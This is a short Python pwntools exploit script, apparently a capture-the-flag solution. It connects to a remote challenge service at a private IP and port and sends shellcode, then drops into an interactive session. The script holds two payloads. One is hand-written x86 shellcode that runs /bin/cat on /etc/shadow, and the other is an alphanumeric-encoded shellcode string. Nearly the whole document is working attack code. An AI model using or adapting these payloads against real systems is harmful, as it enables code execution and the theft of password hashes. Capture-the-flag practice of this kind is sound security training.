from pwn import *
import time

debug = 1
local = 0
attach = local & 1
bps = attach & 1
proc_name = 'ascii.ascii'
#socat TCP4-LISTEN:10001,fork EXEC:./pwn3
ip = '10.105.42.5' 
port = 4446
io = None

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def rl():
	return io.recvline()

def pwn():
	makeio()
	if debug:
		context.log_level = 'debug'
	if attach:
		if bps:
			gdb.attach(pidof(proc_name)[0], open('bps'))
		else:
			gdb.attach(pidof(proc_name)[0])
	shellcode = "\x31\x31\x31\x00\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\xb0\x2c\x2c\x21\xcd\x80"
	shellcode = "PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE1D485C3E1YKM6L7L060Y011T2OKO2B5NJO90MM9M3I00"
	ru("shellcode:\n")
	io.send(shellcode)
	io.interactive()



if __name__ == '__main__':
	pwn()